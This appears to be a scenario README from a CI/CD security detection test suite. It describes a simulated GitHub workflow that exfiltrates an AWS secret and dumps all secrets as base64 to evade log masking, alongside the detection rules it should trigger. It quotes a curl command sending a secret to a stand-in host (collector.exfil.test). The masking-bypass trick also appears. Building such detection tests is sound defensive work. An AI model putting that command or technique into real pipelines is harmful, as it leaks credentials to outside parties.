# 02 — Secret exfiltration

**OWASP Top 10 CI/CD Security Risks:** CICD-SEC-6 Insufficient Credential Hygiene.

A workflow step posts a cloud secret to an external collector and dumps the whole secrets context
as base64 (which bypasses log masking). The repository also contains a committed API key.

**Simulation:** nothing is sent anywhere. The workflow is only parsed, `leaky-repo/` holds a random
synthetic key, and `collector.exfil.test` uses the reserved `.test` TLD. Run telemetry arrives as a
synthetic `workflow_run` webhook.

**Run:** `make attack ID=02` or `.\scripts\make.ps1 attack 02`

| Expected rule | Layer | Why |
|---|---|---|
| SEC-002 (critical) | static | `curl ... collector.exfil.test -d "$AWS_SECRET_ACCESS_KEY"` |
| SEC-001 (critical) | static | `toJSON(secrets)` |
| GL-generic-api-key | static | gitleaks finds the key in `leaky-repo/settings.py` |
| BEH-001 `new_outbound_domain` | behaviour | `collector.exfil.test` never appears in the ci.yml baseline |

Two independent layers, so the roll-up gets the diversity bonus (score >= 90).
